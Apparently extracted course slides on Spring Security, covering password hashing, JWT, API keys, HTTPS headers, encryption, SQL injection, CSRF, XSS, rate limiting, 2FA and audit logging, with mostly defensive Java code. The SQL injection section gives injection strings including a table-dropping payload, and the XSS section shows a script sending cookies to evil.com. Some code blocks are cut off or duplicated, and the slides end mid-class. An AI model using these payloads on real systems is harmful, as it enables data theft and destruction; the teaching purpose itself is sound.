PASSWORD ENCODING — BCRYPT

NEVER store passwords in plain text. Must use a one-way hash function with salt.

Algorithm comparison:

AlgorithmSecure?
MD5❌ Broken
SHA-1❌ Broken
SHA-256⚠️ Too fast, easy to brute force
BCrypt✅ Recommended
Argon2✅ Newest, strongest
PBKDF2✅ FIPS approved

Why BCrypt?

  • Automatic salt — prevents rainbow table attacks
  • Adaptive cost — increase cost as CPUs get faster
  • Slow by design — prevents brute force

BCrypt usage example:

@Configuration
public class PasswordConfig {

  @Bean
  public PasswordEncoder passwordEncoder() {
    // strength = 12 (cost factor)
    return new BCryptPasswordEncoder(12);
  }
}

@Service
@RequiredArgsConstructor
public class UserService {

  private final PasswordEncoder encoder;
  private final UserRepository userRepo;

  public User register(RegisterDTO dto) {
    User user = new User();
    user.setEmail(dto.getEmail());
    // Hash password before saving
    user.setPassword(
      encoder.encode(dto.getPassword()));
    return userRepo.save(user);
  }

  public boolean login(String email, String pwd) {
    User user = userRepo.findByEmail(email)
      .orElseThrow();
    return encoder.matches(pwd, user.getPassword());
  }
}

@Service
@RequiredArgsConstructor
public class CustomUserDetailsService
    implements UserDetailsService {

  private final UserRepository userRepo;

  @Override
  public UserDetails loadUserByUsername(
      String email)
      throws UsernameNotFoundException {

    User user = userRepo.findByEmail(email)
      .orElseThrow(() ->
        new UsernameNotFoundException(
          "User not found: " + email));

    return org.springframework.security
      .core.userdetails.User.builder()
      .username(user.getEmail())
      .password(user.getPassword())
      .authorities(getAuthorities(user))
      .accountExpired(false)
      .accountLocked(false)
      .credentialsExpired(false)
      .disabled(!user.isActive())
      .build();
  }
}

When is LDAP needed?

  • Enterprise apps — users use AD accounts
  • Single Sign-On (SSO) across the organization
  • Centralized user management

@Configuration
@EnableWebSecurity
public class LdapSecurityConfig {

  @Bean
  public SecurityFilterChain filterChain(
      HttpSecurity http) throws Exception {
    return http
      .authorizeHttpRequests(auth -> auth
        .anyRequest().fullyAuthenticated())
      .formLogin(Customizer.withDefaults())
      .build();
  }

  @Bean
  public AuthenticationManager authManager(
      BaseLdapPathContextSource contextSource) {
    LdapBindAuthenticationManagerFactory factory
      = new LdapBindAuthenticationManagerFactory(
        contextSource);
    factory.setUserDnPatterns("uid={0},ou=people");
    factory.setUserSearchBase("ou=people");
    factory.setUserSearchFilter("uid={0}");
    return factory.createAuthenticationManager();
  }

  public BaseLdapPathContextSource contextSource() {
    LdapContextSource source =
      new LdapContextSource();
    source.setUrl("ldap://ldap.cmc.vn:389");
    source.setBase("dc=cmc,dc=vn");
    return source;
  }

SecurityConfig:

@Configuration
@EnableWebSecurity
@EnableMethodSecurity
public class SecurityConfig {

  @Bean
  public SecurityFilterChain filterChain(
      HttpSecurity http) throws Exception {
    http
      .csrf(csrf -> csrf.disable())
      .authorizeHttpRequests(auth -> auth
        .requestMatchers("/api/auth/**")
          .permitAll()
        .requestMatchers("/api/admin/**")
          .hasRole("ADMIN")
        .anyRequest().authenticated()
      )
      .sessionManagement(s -> s
        .sessionCreationPolicy(STATELESS))
      .addFilterBefore(jwtFilter,
        UsernamePasswordAuthFilter.class);
    return http.build();
  }
}

METHOD SECURITY ANNOTATIONS

Security at the method level, not just URLs — provides more detailed control.

Enable Method Security:

@Configuration
@EnableMethodSecurity(
  prePostEnabled = true,
  securedEnabled = true,
  jsr250Enabled = true
)
public class SecurityConfig { }

Annotations:

AnnotationWhen it checks
@PreAuthorizeBefore the method runs
@PostAuthorizeAfter the method runs (checks return)
@PreFilterFilters input collection
@PostFilterFilters output collection
@SecuredSimple (roles only)
@RolesAllowedJSR-250 standard

Detailed examples:

@Service
public class CourseService {

  // ADMIN only
  @PreAuthorize("hasRole('ADMIN')")
  public void deleteCourse(Long id) { }

  // ADMIN or TEACHER
  @PreAuthorize(
    "hasAnyRole('ADMIN','TEACHER')")
  public Course createCourse(CourseDTO dto) { }

  // Owner only
  @PreAuthorize(
    "@courseService.isOwner(#id, principal)")
  public Course updateCourse(
    Long id, CourseDTO dto) { }

  // Filter output
  @PostFilter(
    "filterObject.published == true || " +
    "filterObject.author == authentication.name")
  public List<Course> getAll() { }

  // Check return value
  @PostAuthorize(
    "returnObject.author == authentication.name")
  public Course getMyCourse(Long id) { }
}

JWT — JSON WEB TOKEN

JWT is a compact, self-contained token for secure data exchange. [Wikipedia]

JWT structure (3 parts):

  • Header: algorithm (HS256), type (JWT)
  • Payload: claims (sub, email, roles, exp)
  • Signature: HMAC(header + payload, secret)

JWT flow:

  1. User login → server verifies credentials
  2. Server generates JWT → returns to client
  3. Client stores JWT (localStorage/cookie)
  4. Each request: client sends JWT in header Authorization: Bearer <token>
  5. Server validates JWT → allow/deny

Generate JWT:

public String generateToken(UserDetails user) {
  return Jwts.builder()
    .setSubject(user.getUsername())
    .claim("roles", user.getAuthorities())
    .setIssuedAt(new Date())
    .setExpiration(new Date(
      System.currentTimeMillis() + 86400000))
    .signWith(SignatureAlgorithm.HS256, secret)
    .compact();
}

Validate JWT:

public boolean validateToken(String token) {
  try {
    Jwts.parser()
      .setSigningKey(secret)
      .parseClaimsJws(token);
    return true;
  } catch (JwtException e) {
    return false;
  }
}

JWT AUTHENTICATION FILTER

A filter that intercepts every request, checks for JWT in the header, and automatically authenticates the user.

@Component
@RequiredArgsConstructor
public class JwtAuthFilter
    extends OncePerRequestFilter {

  private final JwtService jwtService;
  private final UserDetailsService userDetailsService;

  @Override
  protected void doFilterInternal(
      HttpServletRequest request,
      HttpServletResponse response,
      FilterChain filterChain)
      throws ServletException, IOException {

    String authHeader = request
      .getHeader("Authorization");

    if (authHeader == null ||
        !authHeader.startsWith("Bearer ")) {
      filterChain.doFilter(request, response);
      return;
    }
    // ... validate & set context
    filterChain.doFilter(request, response);
  }
}

Validate & Set Context:

String token = authHeader.substring(7);
String email = jwtService
  .extractUsername(token);

if (email != null &&
    SecurityContextHolder.getContext()
      .getAuthentication() == null) {

  UserDetails userDetails = userDetailsService
    .loadUserByUsername(email);

  if (jwtService.isTokenValid(
      token, userDetails)) {

    UsernamePasswordAuthenticationToken authToken
      = new UsernamePasswordAuthenticationToken(
        userDetails, null,
        userDetails.getAuthorities());
    authToken.setDetails(
      new WebAuthenticationDetailsSource()
        .buildDetails(request));

    SecurityContextHolder.getContext()
      .setAuthentication(authToken);
  }
}

JWT SERVICE — TOKEN GENERATION & VALIDATION

JwtService:

@Service
public class JwtService {

  @Value("${jwt.secret}")
  private String secretKey;

  @Value("${jwt.expiration}")
  private long jwtExpiration;

  public String generateToken(
      UserDetails userDetails) {
    return generateToken(
      new HashMap<>(), userDetails);
  }

  public String generateToken(
      Map<String, Object> extraClaims,
      UserDetails userDetails) {
    return Jwts.builder()
      .setClaims(extraClaims)
      .setSubject(userDetails.getUsername())
      .setIssuedAt(new Date())
      .setExpiration(new Date(
        System.currentTimeMillis() + jwtExpiration))
      .signWith(getSignInKey(),
        SignatureAlgorithm.HS256)
      .compact();
  }
}

Validation:

public String extractUsername(String token) {
  return extractClaim(token, Claims::getSubject);
}

public boolean isTokenValid(String token,
    UserDetails userDetails) {
  String username = extractUsername(token);
  return username.equals(
    userDetails.getUsername())
    && !isTokenExpired(token);
}

private boolean isTokenExpired(String token) {
  return extractExpiration(token).before(
    new Date());
}

private Key getSignInKey() {
  byte[] keyBytes = Decoders.BASE64
    .decode(secretKey);
  return Keys.hmacShaKeyFor(keyBytes);
}

application.yml:

jwt:
  secret: ${JWT_SECRET}  # DO NOT hardcode!
  expiration: 86400000   # 24 hours
  refresh-expiration: 604800000  # 7 days

REFRESH TOKEN PATTERN

Problem: Access Token should have a short lifespan (15 minutes) for security, but users don't want to log in repeatedly → solution: Refresh Token.

How it works:

  • Login → server returns 2 tokens: Access (15 min) + Refresh (7 days)
  • Client stores refresh token securely (httpOnly cookie)
  • When access token expires → client sends refresh token to get a new access token
  • Refresh token can be revoked server-side

Benefits:

  • Short access token → reduced risk if leaked
  • Good UX — no need to log in again
  • Server can logout user (revoke refresh)

Refresh endpoint:

@RestController
@RequestMapping("/api/auth")
@RequiredArgsConstructor
public class AuthController {

  private final AuthService authService;

  @PostMapping("/login")
  public AuthResponse login(
      @RequestBody LoginRequest req) {
    return authService.authenticate(req);
    // { accessToken, refreshToken }
  }

  @PostMapping("/refresh")
  public AuthResponse refresh(
      @RequestBody RefreshRequest req) {
    return authService.refreshToken(
      req.getRefreshToken());
  }

  @PostMapping("/logout")
  public void logout(
      @RequestBody RefreshRequest req) {
    authService.revokeRefreshToken(
      req.getRefreshToken());
  }
}

API KEY AUTHENTICATION

API Key is used for service-to-service authentication, not user authentication. Suitable for machine clients (third-party integrations).

Characteristics:

  • Long, random, unique string
  • Passed via HTTP header (X-API-Key)
  • Can be revoked server-side
  • Has rate limit per key
  • Has scopes/permissions

Generate API Key:

public String generateApiKey() {
  byte[] randomBytes = new byte[32];
  new SecureRandom().nextBytes(randomBytes);
  return Base64.getUrlEncoder()
    .withoutPadding()
    .encodeToString(randomBytes);
}
// E.g.: "Xx1Yy2Zz3..." (43 characters)

API Key Filter:

@Component
public class ApiKeyFilter
    extends OncePerRequestFilter {

  @Autowired
  private ApiKeyService apiKeyService;

  @Override
  protected void doFilterInternal(
      HttpServletRequest req,
      HttpServletResponse res,
      FilterChain chain)
      throws ServletException, IOException {

    String apiKey = req.getHeader("X-API-Key");

    if (apiKey != null) {
      ApiKeyEntity key = apiKeyService
        .validateAndGet(apiKey);
      if (key != null && key.isActive()) {
        UsernamePasswordAuthenticationToken auth =
          new UsernamePasswordAuthenticationToken(
            key.getClientName(), null,
            key.getAuthorities());
        SecurityContextHolder.getContext()
          .setAuthentication(auth);
      }
    }

    chain.doFilter(req, res);
  }
}

HTTPS, SSL/TLS & CERTIFICATES

HTTPS = HTTP + TLS encryption — mandatory for production to protect transmitted data.

Why HTTPS?

  • Encryption — prevents man-in-the-middle attacks
  • Authentication — verifies server identity
  • Integrity — prevents data tampering
  • SEO ranking — Google prioritizes HTTPS
  • HTTP/2 & HTTP/3 — only run on HTTPS
  • Modern browser features — Service Worker, Geolocation require HTTPS

Getting SSL certificate:

  • Let's Encrypt — free, auto-renew
  • DigiCert, Sectigo — commercial CA
  • Self-signed — for dev only

http

    // Force HTTPS for 1 year
    .httpStrictTransportSecurity(hsts -> hsts
      .maxAgeInSeconds(31536000)
      .includeSubDomains(true))

    // Prevent clickjacking
    .frameOptions(frame -> frame.deny())

    // Prevent MIME sniffing
    .contentTypeOptions(Customizer.withDefaults())

    .contentSecurityPolicy(csp -> csp

        "img-src 'self' data: https:; " +
        "frame-ancestors 'none'"))

    // Referrer
    .referrerPolicy(ref -> ref
      .policy(ReferrerPolicy
        .STRICT_ORIGIN_WHEN_CROSS_ORIGIN)));

DATA ENCRYPTION — SYMMETRIC & ASYMMETRIC

2 types of Encryption:

SymmetricAsymmetric
Keys1 shared keyPublic + Private key
SpeedFastSlower
Use caseEncrypt large dataEncrypt small data, signing
AlgorithmsAES, ChaCha20RSA, ECC

Encrypt sensitive fields in DB:

@Service
public class EncryptionService {

  @Value("${encryption.key}")
  private String secretKey;

  public String encrypt(String plainText) {
    Cipher cipher = Cipher.getInstance(
      "AES/GCM/NoPadding");
    cipher.init(Cipher.ENCRYPT_MODE,
      getKeyFromString(secretKey));
    byte[] encrypted = cipher.doFinal(
      plainText.getBytes());
    return Base64.getEncoder()
      .encodeToString(encrypted);
  }
}

JPA Attribute Converter:

@Converter
public class EncryptedStringConverter
    implements AttributeConverter
      <String, String> {

  @Autowired
  private EncryptionService encryptionService;

  @Override
  public String convertToDatabaseColumn(
      String plainText) {
    return encryptionService.encrypt(plainText);
  }

  @Override
  public String convertToEntityAttribute(
      String encrypted) {
    return encryptionService.decrypt(encrypted);
  }
}

@Entity
public class User {
  @Convert(converter =
    EncryptedStringConverter.class)

    EncryptedStringConverter.class)

SQL INJECTION — EXAMPLES & PREVENTION

❌ Vulnerable code:

// String concatenation - VERY BAD!
String email = request.getParameter("email");
String sql = "SELECT * FROM users WHERE " +
  "email = '" + email + "'";
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(sql);

// Attacker inputs:
// email = ' OR '1'='1
// Query becomes:
// SELECT * FROM users WHERE email = ''
//   OR '1'='1
// → Returns ALL users!

// Or even more dangerous:
// email = '; DROP TABLE users; --
// → Drops the entire table!

✅ Prevention methods:

// 1. Prepared Statement
String sql = "SELECT * FROM users " +
  "WHERE email = ?";
PreparedStatement ps =
  conn.prepareStatement(sql);
ps.setString(1, email);
ResultSet rs = ps.executeQuery();
// Driver automatically escapes special chars

// 2. JPA - automatically safe
@Query("SELECT u FROM User u " +
  "WHERE u.email = :email")
User findByEmail(@Param("email") String email);

// 3. Spring Data - method name
Optional<User> findByEmail(String email);
// Automatically generates prepared statement

Best practices:

  • Always use parameterized queries
  • Validate input (whitelist format)
  • Least privilege — DB user should not have DROP
  • WAF (Web Application Firewall)

CSRF — CROSS-SITE REQUEST FORGERY

CSRF — an attacker tricks a user into performing an unintended request (e.g., money transfer) while the user is logged into another website.

Attack method:

  1. User logs into bank.com
  2. User visits evil.com
  3. evil.com has a hidden form POSTing to bank.com
  4. Browser automatically sends session cookie → bank trusts it → money transferred

Prevention methods:

  • CSRF Token — random token per session, server verifies each request
  • SameSite Cookie — only send cookies for same origin
  • Custom headers — require X-Requested-With
  • Stateless API + JWT — no CSRF needed (no cookies used)

Spring Security CSRF:

@Configuration
@EnableWebSecurity
public class SecurityConfig {

  @Bean
  public SecurityFilterChain filterChain(
      HttpSecurity http) throws Exception {
    http
      // Enable CSRF for traditional web apps
      .csrf(csrf -> csrf
        .csrfTokenRepository(
          CookieCsrfTokenRepository
            .withHttpOnlyFalse()))

      // Or disable for stateless REST API
      // .csrf(csrf -> csrf.disable())

      .authorizeHttpRequests(...)
      .build();
  }
}

REST API with JWT typically disables CSRF because the token is stored in the header (not an automatic cookie).

XSS — CROSS-SITE SCRIPTING

XSS — an attacker injects malicious JavaScript into a web page that runs in the victim's browser.

3 types of XSS:

TypeDescription
StoredScript stored in DB (comment, profile)
ReflectedScript in URL, server echoes back
DOM-basedScript injected via client-side JS

Attack example:

<!-- User enters a comment -->
<script>
  fetch('https://evil.com/steal?cookie=' +
    document.cookie);

  • Output encoding — escape HTML when rendering
  • Content Security Policy (CSP) — only allow scripts from trusted domains
  • Validate input — accept specific formats only
  • HttpOnly cookies — JS cannot read cookies
  • Sanitize HTML — use OWASP Java HTML Sanitizer

RATE LIMITING — PREVENTING BRUTE FORCE

Rate Limiting limits the number of requests from an IP/user within a time period → prevents brute force, DoS, abuse.

Strategies:

  • Fixed Window — N requests / minute
  • Sliding Window — more precise
  • Token Bucket — burst-friendly
  • Leaky Bucket — smooth rate

Bucket4j with Spring Boot:

<dependency>
  <groupId>com.bucket4j</groupId>
  <artifactId>bucket4j-core</artifactId>
</dependency>

Example: Login rate limit

@Service
public class RateLimitService {

  private final Map<String, Bucket> cache =
    new ConcurrentHashMap<>();

  public Bucket resolveBucket(String key) {
    return cache.computeIfAbsent(key,
      k -> Bucket.builder()
        .addLimit(Bandwidth.classic(5,
          Refill.intervally(5,
            Duration.ofMinutes(1))))
        .build());
  }
}

@PostMapping("/login")
public AuthResponse login(
    @RequestBody LoginRequest req,
    HttpServletRequest http) {
  String ip = http.getRemoteAddr();
  Bucket bucket = rateLimitService
    .resolveBucket(ip);

  if (!bucket.tryConsume(1)) {
    throw new TooManyRequestsException(
      "Try again later");
  }
  return authService.authenticate(req);
}

API Gateway (Kong, Nginx, AWS API Gateway) typically handles rate limiting at the edge layer.

2FA — TWO-FACTOR AUTHENTICATION

2FA requires 2 layers of authentication: password + device (phone) → reduces 99% of account takeovers.

Methods:

MethodSecurity
SMS OTP⚠️ Vulnerable to SIM swap
Email OTP⚠️ Depends on email security
TOTP (Google Authenticator)✅ Secure
Push notification✅ Good UX
Hardware key (YubiKey)✅✅ Strongest
Biometric✅ Touch/Face ID

TOTP Flow:

  1. User logs in with password
  2. Server requests 6-digit OTP
  3. App (Google Authenticator) generates OTP
  4. Server verifies OTP → grants access

Implement TOTP:

<dependency>
  <groupId>dev.samstevens.totp</groupId>
  <artifactId>totp</artifactId>
</dependency>

@Service
public class TwoFactorService {

  // Generate secret for user
  public String generateSecret() {
    return new DefaultSecretGenerator()
      .generate();
  }

  // Generate QR code for user to scan
  public String getQRCodeUri(
      String secret, String email) {
    return new QrData.Builder()
      .label(email)
      .secret(secret)
      .issuer("CMC University")
      .algorithm(HashingAlgorithm.SHA1)
      .digits(6)
      .period(30)
      .build()
      .getUri();
  }

  // Verify OTP from user
  public boolean verifyCode(
      String secret, String code) {
    return new DefaultCodeVerifier(
      new DefaultCodeGenerator(),
      new SystemTimeProvider())
      .isValidCode(secret, code);
  }
}

AUDIT LOGGING — TRACKING BEHAVIOR

Audit Log records important actions — mandatory for compliance (GDPR, HIPAA, PCI DSS).

What to log:

  • Authentication (login, logout, failed)
  • Authorization (access denied)
  • Data changes (CRUD on sensitive data)
  • Admin actions (create user, change role)
  • Security events (brute force, suspicious IP)

Audit Entity:

@Entity
@Data
public class AuditLog {
  @Id @GeneratedValue
  private Long id;
  private String username;
  private String action;
  private String entityType;
  private String entityId;
  private String details;
  private String ipAddress;
  private LocalDateTime timestamp;
}

Spring Security Event Listener:

@Component
@RequiredArgsConstructor
public class SecurityEventListener {

  private final AuditLogRepository auditRepo;

  @EventListener
  public void onLoginSuccess(
      AuthenticationSuccessEvent event) {
    AuditLog log = new AuditLog();
    log.setUsername(event.getAuthentication()
      .getName());
    log.setAction("LOGIN_SUCCESS");
    log.setTimestamp(LocalDateTime.now());
    auditRepo.save(log);
  }

  @EventListener
  public void onLoginFailure(
      AbstractAuthenticationFailureEvent event) {
    AuditLog log = new AuditLog();
    log.setUsername((String) event
      .getAuthentication().getPrincipal());
    log.setAction("LOGIN_FAILED");
    log.setDetails(event.getException()
      .getMessage());
    auditRepo.save(log);
  }
}

@Configuration
@EnableWebSecurity
@EnableMethodSecurity
@RequiredArgsConstructor
public class SecurityConfig {

  private final JwtAuthFilter jwtFilter;
  private final UserDetailsService userDetailsService;
